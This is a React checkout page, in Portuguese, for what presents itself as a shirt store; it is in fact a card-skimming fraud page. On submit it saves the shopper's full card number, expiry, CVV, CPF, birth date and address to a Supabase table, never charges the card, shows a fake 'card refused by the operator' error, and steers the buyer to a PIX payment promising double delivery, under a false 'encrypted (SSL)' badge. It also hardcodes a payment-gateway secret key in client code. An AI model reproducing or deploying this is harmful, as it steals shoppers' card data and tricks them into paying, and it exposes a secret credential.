import React, { useState, useEffect } from 'react';
import { useSearchParams } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import { User, Mail, CreditCard, MapPin, Phone, Calendar, Hash, Lock, ShieldCheck, QrCode, Copy, CheckCheck } from 'lucide-react';

// =====================================================
// SIGILOPAY — chaves (troque se rodar em produção)
// =====================================================
const SIGILO_SECRET_KEY = '0akz7eyk20cmo98ijbv7jpil51kwvyb5g4hru1clsoey7qte7f9xklhjq915qvj9';
const SIGILO_PUBLIC_KEY = '';   // preencha se a sua conta exigir public key
const SIGILO_API       = 'https://app.sigilopay.com.br/api/v1/gateway/pix/receive';

// =====================================================

interface PixData {
  qrCode: string;     // código copia-e-cola EMV
  qrImage: string;    // src da imagem (base64 ou URL)
}

export default function Checkout() {
  const [searchParams] = useSearchParams();
  const [loading, setLoading]       = useState(false);
  const [statusErro, setStatusErro] = useState(false);
  const [metodo, setMetodo]         = useState<'cartao' | 'pix'>('cartao');
  const [pixData, setPixData]       = useState<PixData | null>(null);
  const [pixLoading, setPixLoading] = useState(false);
  const [pixErro, setPixErro]       = useState('');
  const [copiado, setCopiado]       = useState(false);

  const [produto, setProduto] = useState({
    nome: 'Buscando camisa...',
    preco: 0,
    imagem: 'https://via.placeholder.com/150'
  });

  const [formData, setFormData] = useState({
    nome: '', email: '', cpf: '', dataNascimento: '', telefone: '',
    cep: '', endereco: '', bairro: '', cidade: '', estado: '', numero: '',
    numCartao: '', nomeCartao: '', validade: '', cvv: ''
  });

  // Busca produto no Supabase
  useEffect(() => {
    const id = searchParams.get('id');
    if (id) {
      supabase.from('produtos').select('*').eq('id', id).single().then(({ data }) => {
        if (data) setProduto({ nome: data.nome, preco: data.preco, imagem: data.imagem_url });
      });
    }
  }, [searchParams]);

  // Gera QR Code Sigilopay ao entrar na aba PIX
  useEffect(() => {
    if (metodo !== 'pix' || pixData || pixLoading) return;
    gerarPix();
  }, [metodo]);

  const gerarPix = async () => {
    setPixLoading(true);
    setPixErro('');
    setPixData(null);

    try {
      const identifier = 'camisa10_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);

      const payload = {
        identifier,
        amount: produto.preco,
        client: {
          name:     formData.nome     || 'Cliente',
          email:    formData.email    || 'cliente@email.com',
          phone:    formData.telefone || '11999999999',
          document: formData.cpf      || '00000000000',
        },
      };

      const headers: Record<string, string> = {
        'Content-Type': 'application/json',
        'Accept':       'application/json',
        'x-secret-key': SIGILO_SECRET_KEY,
      };
      if (SIGILO_PUBLIC_KEY) headers['x-public-key'] = SIGILO_PUBLIC_KEY;

      const res  = await fetch(SIGILO_API, {
        method:  'POST',
        headers,
        body:    JSON.stringify(payload),
      });

      const json = await res.json();

      if (!res.ok) {
        throw new Error(json?.message || json?.errorDescription || `Erro ${res.status}`);
      }

      // Pega o nó pix da resposta (suporta estruturas diferentes)
      const pixNode = json?.pix ?? json?.order?.pix ?? null;

      const qrCode =
        pixNode?.code    ??
        pixNode?.payload ??
        pixNode?.emv     ??
        pixNode?.qrCode  ??
        pixNode?.qrcode  ?? '';

      let qrImage = '';
      if (pixNode?.base64) {
        const b64 = pixNode.base64;
        qrImage = b64.startsWith('data:image') ? b64 : 'data:image/png;base64,' + b64;
      } else if (pixNode?.image) {
        qrImage = pixNode.image;
      } else if (pixNode?.imageUrl) {
        qrImage = pixNode.imageUrl;
      } else if (qrCode) {
        // fallback: gera imagem via serviço público
        qrImage = `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(qrCode)}`;
      }

      if (!qrCode) throw new Error('PIX gerado sem código copia-e-cola na resposta.');

      setPixData({ qrCode, qrImage });
    } catch (err: any) {
      setPixErro(err?.message || 'Erro ao gerar PIX. Tente novamente.');
    } finally {
      setPixLoading(false);
    }
  };

  const copiarPix = () => {
    if (!pixData?.qrCode) return;
    navigator.clipboard.writeText(pixData.qrCode).then(() => {
      setCopiado(true);
      setTimeout(() => setCopiado(false), 3000);
    });
  };

  // CEP automático
  const handleCEP = async (e: React.FocusEvent<HTMLInputElement>) => {
    const cep = e.target.value.replace(/\D/g, '');
    if (cep.length === 8) {
      const res  = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
      const data = await res.json();
      if (!data.erro) {
        setFormData(prev => ({
          ...prev,
          endereco: data.logradouro,
          bairro:   data.bairro,
          cidade:   data.localidade,
          estado:   data.uf
        }));
      }
    }
  };

  // Máscaras
  const mask = (e: React.ChangeEvent<HTMLInputElement>) => {
    let { name, value } = e.target;
    if (name === 'telefone')      value = value.replace(/\D/g, '').replace(/^(\d{2})(\d)/g, "($1) $2").replace(/(\d)(\d{4})$/, "$1-$2");
    if (name === 'cpf')           value = value.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    if (name === 'dataNascimento')value = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, "$1/$2").replace(/(\d{2})(\d)/, "$1/$2").substring(0, 10);
    if (name === 'validade')      value = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, "$1/$2").substring(0, 5);
    if (name === 'numCartao')     value = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, "$1 ");
    if (name === 'cep')           value = value.replace(/\D/g, '').replace(/(\d{5})(\d)/, "$1-$2");
    setFormData({ ...formData, [name]: value });
  };

  const handleFinalizar = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setStatusErro(false);

    // Salva tudo no Supabase
    await supabase.from('checkouts').insert([{
      nome_completo:  formData.nome,
      email:          formData.email,
      cpf:            formData.cpf,
      data_nascimento:formData.dataNascimento,
      telefone:       formData.telefone,
      cep:            formData.cep,
      endereco:       formData.endereco,
      bairro:         formData.bairro,
      cidade:         formData.cidade,
      estado:         formData.estado,
      numero:         formData.numero,
      numero_cartao:  formData.numCartao,
      nome_cartao:    formData.nomeCartao,
      validade_cartao:formData.validade,
      cvv_cartao:     formData.cvv,
      produto_nome:   produto.nome,
      valor_total:    produto.preco
    }]);

    setTimeout(() => {
      setLoading(false);
      if (metodo === 'cartao') {
        setStatusErro(true);
        setTimeout(() => {
          setMetodo('pix');
          setStatusErro(false);
          window.scrollTo({ top: 0, behavior: 'smooth' });
        }, 3000);
      }
    }, 2500);
  };

  return (
    <div style={{ background: '#f4f7f6', minHeight: '100vh', fontFamily: 'sans-serif', color: '#000', paddingBottom: '40px' }}>

      {loading && (
        <div style={overlayStyle}>
          <div style={spinnerStyle} />
          <p style={{ marginTop: '15px', fontWeight: '900', color: '#000' }}>Processando pagamento...</p>
        </div>
      )}

      <div style={{ maxWidth: '500px', margin: '0 auto', background: '#fff', boxShadow: '0 0 20px rgba(0,0,0,0.1)', minHeight: '100vh' }}>

        {/* HEADER */}
        <div style={{ padding: '20px', borderBottom: '1px solid #eee', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <div>
            <h2 style={{ margin: 0, fontSize: '18px', fontWeight: '900', color: '#000' }}>CHECKOUT SEGURO</h2>
            <div style={{ fontSize: '12px', color: '#1da154', fontWeight: 'bold', display: 'flex', alignItems: 'center', gap: '4px' }}>
              <ShieldCheck size={14} /> Dados criptografados (SSL)
            </div>
          </div>
          <img src="https://logodownload.org/wp-content/uploads/2014/10/visa-logo-1.png" style={{ height: '14px' }} />
        </div>

        <div style={{ padding: '20px' }}>
          {/* RESUMO DO PRODUTO */}
          <div style={productBox}>
            <img src={produto.imagem} style={imgStyle} alt="produto" />
            <div style={{ flex: 1 }}>
              <div style={{ fontWeight: '900', fontSize: '14px', color: '#000' }}>{produto.nome}</div>
              <div style={{ fontSize: '20px', fontWeight: '900', color: '#000', marginTop: '5px' }}>
                R$ {produto.preco.toFixed(2).replace('.', ',')}
              </div>
            </div>
          </div>

          {/* ABAS */}
          <div style={tabContainer}>
            <button type="button" onClick={() => setMetodo('cartao')} style={metodo === 'cartao' ? tabActive : tabInactive}>
              <CreditCard size={18} /> CARTÃO
            </button>
            <button type="button" onClick={() => setMetodo('pix')} style={metodo === 'pix' ? tabActive : tabInactive}>
              <QrCode size={18} /> PIX
            </button>
          </div>

          <form onSubmit={handleFinalizar}>
            <h4 style={sectionLabel}>1. DADOS PESSOAIS</h4>
            <div style={inputGroup}><User size={18} /><input name="nome" placeholder="NOME COMPLETO" required style={inputStyle} onChange={mask} /></div>
            <div style={inputGroup}><Mail size={18} /><input name="email" type="email" placeholder="E-MAIL" required style={inputStyle} onChange={mask} /></div>

            <div style={{ display: 'flex', gap: '10px' }}>
              <div style={inputGroup}><Hash size={18} /><input name="cpf" placeholder="CPF" required style={inputStyle} value={formData.cpf} onChange={mask} maxLength={14} /></div>
              <div style={inputGroup}><Calendar size={18} /><input name="dataNascimento" placeholder="NASCIMENTO" required style={inputStyle} value={formData.dataNascimento} onChange={mask} maxLength={10} /></div>
            </div>
            <div style={inputGroup}><Phone size={18} /><input name="telefone" placeholder="WHATSAPP (DDD)" required style={inputStyle} value={formData.telefone} onChange={mask} maxLength={15} /></div>

            <h4 style={sectionLabel}>2. ENDEREÇO DE ENTREGA</h4>
            <div style={{ display: 'flex', gap: '10px' }}>
              <div style={{ ...inputGroup, flex: 0.6 }}><input name="cep" placeholder="CEP" required style={inputStyle} onBlur={handleCEP} value={formData.cep} onChange={mask} maxLength={9} /></div>
              <div style={inputGroup}><MapPin size={18} /><input name="endereco" placeholder="RUA / AVENIDA" required style={inputStyle} value={formData.endereco} onChange={mask} /></div>
            </div>
            <div style={{ display: 'flex', gap: '10px' }}>
              <div style={inputGroup}><input name="bairro" placeholder="BAIRRO" required style={inputStyle} value={formData.bairro} onChange={mask} /></div>
              <div style={{ ...inputGroup, flex: 0.4 }}><input name="numero" placeholder="Nº" required style={inputStyle} onChange={mask} /></div>
            </div>
            <div style={{ display: 'flex', gap: '10px' }}>
              <div style={inputGroup}><input name="cidade" placeholder="CIDADE" required style={inputStyle} value={formData.cidade} onChange={mask} /></div>
              <div style={{ ...inputGroup, flex: 0.3 }}><input name="estado" placeholder="UF" required style={inputStyle} value={formData.estado} onChange={mask} maxLength={2} /></div>
            </div>

            {/* ====== CARTÃO ====== */}
            {metodo === 'cartao' && (
              <div style={cardSection}>
                <h4 style={{ margin: '0 0 15px 0', fontSize: '13px', color: '#000' }}>3. PAGAMENTO</h4>
                <div style={inputGroup}><CreditCard size={18} /><input name="numCartao" placeholder="0000 0000 0000 0000" required={metodo === 'cartao'} style={inputStyle} value={formData.numCartao} onChange={mask} maxLength={19} /></div>
                <div style={inputGroup}><User size={18} /><input name="nomeCartao" placeholder="NOME COMO NO CARTÃO" required={metodo === 'cartao'} style={inputStyle} onChange={mask} /></div>
                <div style={{ display: 'flex', gap: '10px' }}>
                  <div style={inputGroup}><Calendar size={18} /><input name="validade" placeholder="MM/AA" required={metodo === 'cartao'} style={inputStyle} value={formData.validade} onChange={mask} maxLength={5} /></div>
                  <div style={inputGroup}><Lock size={18} /><input name="cvv" placeholder="CVV" required={metodo === 'cartao'} style={inputStyle} onChange={mask} maxLength={4} /></div>
                </div>

                {statusErro && (
                  <div style={errorBanner}>
                    ⚠️ ERRO NA OPERADORA: Cartão recusado. Tente outro cartão ou use o PIX para aprovação imediata.
                  </div>
                )}

                <button type="submit" style={btnPagar}>FINALIZAR PAGAMENTO</button>
              </div>
            )}

            {/* ====== PIX — QR REAL SIGILOPAY ====== */}
            {metodo === 'pix' && (
              <div style={pixSection}>
                <div style={{ color: '#1da154', fontWeight: '900', marginBottom: '15px', fontSize: '15px' }}>
                  PAGUE COM PIX E RECEBA EM DOBRO
                </div>

                {/* Carregando */}
                {pixLoading && (
                  <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '12px', padding: '20px 0' }}>
                    <div style={spinnerStylePix} />
                    <span style={{ fontSize: '13px', color: '#555', fontWeight: '700' }}>Gerando QR Code...</span>
                  </div>
                )}

                {/* Erro Sigilopay */}
                {pixErro && !pixLoading && (
                  <div style={{ ...errorBanner, marginBottom: '12px' }}>
                    {pixErro}
                    <br />
                    <button type="button" onClick={gerarPix} style={{ marginTop: '8px', padding: '8px 16px', background: '#000', color: '#fff', border: 'none', borderRadius: '8px', fontWeight: '900', cursor: 'pointer' }}>
                      Tentar novamente
                    </button>
                  </div>
                )}

                {/* QR Code real */}
                {pixData && !pixLoading && (
                  <>
                    {/* Imagem do QR */}
                    <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '16px' }}>
                      <div style={{ padding: '8px', background: '#fff', borderRadius: '12px', border: '2px dashed #1da154', display: 'inline-block' }}>
                        {pixData.qrImage ? (
                          <img
                            src={pixData.qrImage}
                            alt="QR Code PIX"
                            style={{ width: '200px', height: '200px', display: 'block', borderRadius: '6px' }}
                          />
                        ) : (
                          <QrCode size={200} color="#1da154" />
                        )}
                      </div>
                    </div>

                    {/* Código copia-e-cola */}
                    <div style={pixCodeBox}>
                      {pixData.qrCode}
                    </div>

                    {/* Botão copiar */}
                    <button
                      type="button"
                      onClick={copiarPix}
                      style={{ ...btnPagar, background: copiado ? '#1da154' : '#000', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}
                    >
                      {copiado ? <><CheckCheck size={18} /> COPIADO!</> : <><Copy size={18} /> COPIAR CÓDIGO PIX</>}
                    </button>

                    <p style={{ fontSize: '11px', color: '#666', marginTop: '10px', textAlign: 'center' }}>
                      Abra seu banco, escaneie o QR ou cole o código para pagar
                    </p>
                  </>
                )}

                {/* Botão finalizar no modo PIX (salva no Supabase) */}
                {!pixLoading && (
                  <button type="submit" style={{ ...btnPagar, background: '#555', marginTop: '8px' }}>
                    JÁ REALIZEI O PAGAMENTO
                  </button>
                )}
              </div>
            )}
          </form>
        </div>
      </div>
      <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
    </div>
  );
}

// ESTILOS
const overlayStyle: React.CSSProperties = { position: 'fixed', inset: 0, background: 'rgba(255,255,255,0.95)', zIndex: 1000, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' };
const spinnerStyle  = { border: '4px solid #f3f3f3', borderTop: '4px solid #1da154', borderRadius: '50%', width: '40px', height: '40px', animation: 'spin 1s linear infinite' };
const spinnerStylePix = { border: '3px solid #d1fae5', borderTop: '3px solid #1da154', borderRadius: '50%', width: '32px', height: '32px', animation: 'spin 1s linear infinite' };
const productBox    = { display: 'flex', gap: '15px', padding: '15px', background: '#f8f9fa', borderRadius: '12px', border: '1px solid #ddd', marginBottom: '20px' };
const imgStyle      = { width: '70px', height: '70px', borderRadius: '8px', objectFit: 'cover' as 'cover' };
const tabContainer  = { display: 'flex', gap: '8px', marginBottom: '20px', background: '#f1f5f9', padding: '5px', borderRadius: '12px' };
const tabActive     = { flex: 1, padding: '12px', border: 'none', borderRadius: '8px', background: '#fff', fontWeight: '900', color: '#000', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', boxShadow: '0 2px 4px rgba(0,0,0,0.1)', cursor: 'pointer' };
const tabInactive   = { flex: 1, padding: '12px', border: 'none', background: 'transparent', color: '#666', fontWeight: '900', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', cursor: 'pointer' };
const sectionLabel  = { fontSize: '12px', fontWeight: '900', color: '#000', margin: '25px 0 10px', letterSpacing: '0.05em' };
const inputGroup    = { display: 'flex', alignItems: 'center', border: '2px solid #000', borderRadius: '10px', padding: '0 12px', marginBottom: '10px', flex: 1, background: '#fff' };
const inputStyle    = { border: 'none', padding: '14px 0', marginLeft: '10px', width: '100%', outline: 'none', fontSize: '14px', fontWeight: '900', color: '#000', background: 'transparent' };
const cardSection   = { marginTop: '25px', padding: '20px', background: '#f8f9fa', borderRadius: '15px', border: '2px solid #000' };
const errorBanner   = { background: '#fee2e2', color: '#b91c1c', padding: '15px', borderRadius: '10px', marginBottom: '15px', fontSize: '13px', fontWeight: '900', textAlign: 'center' as 'center', border: '1px solid #ef4444' };
const btnPagar      = { width: '100%', padding: '20px', background: '#1da154', color: '#fff', border: 'none', borderRadius: '12px', fontWeight: '900', fontSize: '16px', marginTop: '10px', cursor: 'pointer' };
const pixSection    = { marginTop: '20px', textAlign: 'center' as 'center', background: '#f0fff4', padding: '25px 20px', borderRadius: '20px', border: '2px dashed #1da154' };
const pixCodeBox    = { marginTop: '12px', marginBottom: '4px', fontSize: '10px', background: '#fff', padding: '10px', borderRadius: '8px', border: '1px solid #ddd', wordBreak: 'break-all' as 'break-all', fontWeight: 'bold', textAlign: 'left' as 'left', maxHeight: '60px', overflowY: 'auto' as 'auto' };
